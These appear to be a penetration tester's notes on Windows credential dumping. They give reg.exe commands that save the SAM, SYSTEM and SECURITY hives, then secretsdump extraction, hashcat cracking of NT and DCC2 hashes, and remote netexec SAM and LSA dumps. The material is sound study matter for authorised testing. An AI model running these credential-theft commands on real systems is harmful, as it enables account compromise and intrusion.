- With local admin, we can dump SAM (local user hashes) and SECURITY (cached domain creds, DPAPI keys) offline

## Steps
1. Save the registry hives (need admin cmd)
```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```
- need SYSTEM too, it holds the boot key used to decrypt SAM

2. Move the 3 files to our attack box (see File Transfer, impacket smbserver works well for this)

3. Dump with secretsdump
```bash
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

# Example Output
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
```

- format is `username:rid:lmhash:nthash`
- the lmhash `aad3b435...089c0` repeating on every account = LM is disabled (normal on modern Windows), the NT hash (last part) is the real one we crack

4. Crack the NT hash
```bash
# put the hash inside the hashestocrack.txt
hashcat -m 1000 hashestocrack.txt rockyou.txt
```
- `-m 1000` = NT hash mode

---
## DCC2 (cached domain logins, from SECURITY hive)
- found in `secretsdump` output as domain cached logon info
- much slower to crack than NT (about 800x), because it uses PBKDF2, don't expect to crack a strong one in time

```bash
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' rockyou.txt
```

---
## Remote version (no file transfer needed)
- if we already have creds with admin rights, netexec can dump both SAM and LSA secrets directly over the network

```bash
netexec smb <ip> --local-auth -u bob -p 'pass' --sam
netexec smb <ip> --local-auth -u bob -p 'pass' --lsa
```
- `(Pwn3d!)` in output confirms the creds have admin rights
